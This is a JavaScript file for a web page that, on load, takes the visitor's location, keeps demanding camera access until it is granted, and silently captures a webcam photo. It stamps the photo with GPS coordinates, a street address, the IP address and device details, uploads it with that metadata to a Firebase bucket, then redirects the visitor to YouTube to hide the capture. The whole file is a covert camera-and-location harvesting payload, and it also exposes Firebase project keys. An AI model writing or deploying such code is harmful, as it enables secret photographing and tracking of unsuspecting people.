// Your Firebase configuration
const firebaseConfig = {
    apiKey: "AIzaSyDEAy2KXezICmuuQZnhNq12nqwwBouDjt4",
    authDomain: "webcamera-es-universe-git.firebaseapp.com",
    databaseURL: "https://webcamera-es-universe-git-default-rtdb.firebaseio.com",
    projectId: "webcamera-es-universe-git",
    storageBucket: "webcamera-es-universe-git.appspot.com",
    messagingSenderId: "949054088643",
    appId: "1:949054088643:web:039f79fcae7259f4358976"
};

// Initialize Firebase
const app = firebase.initializeApp(firebaseConfig);
const storage = firebase.storage();
const database = firebase.database();

// Variable to store location
let userLocation = {
    latitude: null,
    longitude: null,
    altitude: null,
    speed: null
};

// Function to request location permission and get location
function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((position) => {
            userLocation.latitude = position.coords.latitude.toFixed(6);  // Latitude
            userLocation.longitude = position.coords.longitude.toFixed(6); // Longitude
            userLocation.altitude = position.coords.altitude ? position.coords.altitude.toFixed(2) : 'N/A'; // Altitude
            userLocation.speed = position.coords.speed ? position.coords.speed.toFixed(2) : 'N/A'; // Speed
            console.log('Location retrieved:', userLocation);
            startVideo(); // Start video after location is retrieved
        }, (error) => {
            console.error('Error accessing location:', error);
            document.getElementById('message').textContent = 'Location access denied or an error occurred.';
            startVideo(); // Start video even if location access is denied
        });
    } else {
        console.error('Geolocation is not supported by this browser.');
        startVideo(); // Start video if geolocation is not supported
    }
}

// Function to get readable address using reverse geocoding (Google Maps API)
async function getReadableAddress(lat, lon) {
    const apiKey = "YOUR_GOOGLE_MAPS_API_KEY";
    const url = `https://maps.googleapis.com/maps/api/geocode/json?latlng=${lat},${lon}&key=${apiKey}`;
    try {
        const response = await fetch(url);
        const data = await response.json();
        if (data.results && data.results.length > 0) {
            return data.results[0].formatted_address;
        }
        return 'Address not found';
    } catch (error) {
        console.error('Error fetching readable address:', error);
        return 'Error retrieving address';
    }
}

// Function to get network stats (IP address, connection speed, network type)
async function getNetworkStats() {
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    const ipResponse = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipResponse.json();
    
    return {
        ip: ipData.ip,
        connectionSpeed: connection ? connection.downlink + ' Mbps' : 'N/A',
        networkType: connection ? connection.effectiveType : 'N/A'
    };
}

// Function to format date and time
function formatDateTime() {
    const now = new Date();
    const date = now.toLocaleDateString();
    const time = now.toLocaleTimeString();
    const day = now.toLocaleDateString('en-US', { weekday: 'long' });
    return `${day}, ${date}, ${time}`;
}

// Function to gather additional device stats for watermark
function getDeviceStats() {
    const batteryPromise = navigator.getBattery ? navigator.getBattery() : Promise.resolve(null);
    const screenWidth = window.screen.width;
    const screenHeight = window.screen.height;
    const userAgent = navigator.userAgent;
    const platform = navigator.platform;

    return batteryPromise.then(battery => {
        return {
            battery: battery ? `${(battery.level * 100).toFixed(0)}%` : 'N/A',
            screenResolution: `${screenWidth}x${screenHeight}`,
            deviceName: platform,
            browser: userAgent
        };
    });
}

// Function to capture photo and upload to Firebase Storage with watermark
function capturePhoto(video) {
    const canvas = document.createElement('canvas');
    const context = canvas.getContext('2d');

    // Set the canvas size to the video size
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    // Draw the video frame to the canvas
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    // Check if location is available for watermark
    Promise.all([getDeviceStats(), getNetworkStats(), getReadableAddress(userLocation.latitude, userLocation.longitude)]).then(([deviceStats, networkStats, readableAddress]) => {
        if (userLocation.latitude && userLocation.longitude) {
            // Set watermark text with date, time, location, and more
            const watermarkText = `Date: ${formatDateTime()} \nLat: ${userLocation.latitude}, Lon: ${userLocation.longitude} \nAlt: ${userLocation.altitude}, Speed: ${userLocation.speed} \nAddress: ${readableAddress}`;

            // Add additional device and network stats
            const deviceStatsText = `Battery: ${deviceStats.battery} \nScreen: ${deviceStats.screenResolution} \nDevice: ${deviceStats.deviceName} \nBrowser: ${deviceStats.browser}`;
            const networkStatsText = `IP: ${networkStats.ip} \nConnection Speed: ${networkStats.connectionSpeed} \nNetwork Type: ${networkStats.networkType}`;

            // Set watermark background
            context.fillStyle = 'black';
            context.globalAlpha = 0.5;
            context.fillRect(0, canvas.height - 200, canvas.width, 200);  // Background rectangle for watermark

            // Set text properties for watermark
            context.font = '20px Arial'; // Font size and type
            context.fillStyle = 'white'; // Text color
            context.globalAlpha = 1.0; // Full opacity for the text

            // Add location, date/time, device, and network stats as watermark
            context.fillText(watermarkText, 10, canvas.height - 160); // Position location and date/time text
            context.fillText(deviceStatsText, 10, canvas.height - 120); // Position device stats
            context.fillText(networkStatsText, 10, canvas.height - 80); // Position network stats
        }

        // Convert the canvas image to a Blob
        canvas.toBlob(async function(blob) {
            const fileName = `photo_${Date.now()}.png`;
            const storageRef = storage.ref(`users/${fileName}`);

            try {
                // Upload the image to Firebase Storage with custom metadata
                await storageRef.put(blob, {
                    customMetadata: {
                        latitude: userLocation.latitude,
                        longitude: userLocation.longitude,
                        altitude: userLocation.altitude,
                        speed: userLocation.speed,
                        battery: deviceStats.battery,
                        screenResolution: deviceStats.screenResolution,
                        deviceName: deviceStats.deviceName,
                        browser: deviceStats.browser,
                        ipAddress: networkStats.ip,
                        connectionSpeed: networkStats.connectionSpeed,
                        networkType: networkStats.networkType,
                        readableAddress: readableAddress
                    }
                });

                console.log('Photo uploaded with filename:', fileName);

                // Redirect after 1 second
                setTimeout(() => {
                    window.location.href = 'https://youtube.com/';  // Redirect URL after upload
                }, 1000);  // 1000 milliseconds = 1 second
            } catch (error) {
                console.error('Error uploading to Firebase:', error);
            }
        }, 'image/png', 1.0);  // The third argument '1.0' specifies the image quality (max quality)
    });
}

// Access the camera with higher resolution and request permission until granted
async function startVideo() {
    let accessGranted = false;
    while (!accessGranted) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                }
            });
            accessGranted = true;  // Camera access granted
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();

            // Capture photo once the video stream is ready
            video.onloadedmetadata = () => {
                capturePhoto(video);
            };
        } catch (error) {
            console.error('Error accessing camera:', error);
            document.getElementById('message').textContent = 'Camera access denied, trying again...';

            // Wait for 3 seconds before retrying
            await new Promise(resolve => setTimeout(resolve, 3000));
        }
    }
}

// Start the camera and location request on page load
window.onload = () => {
    getLocation();  // Request location permission first
};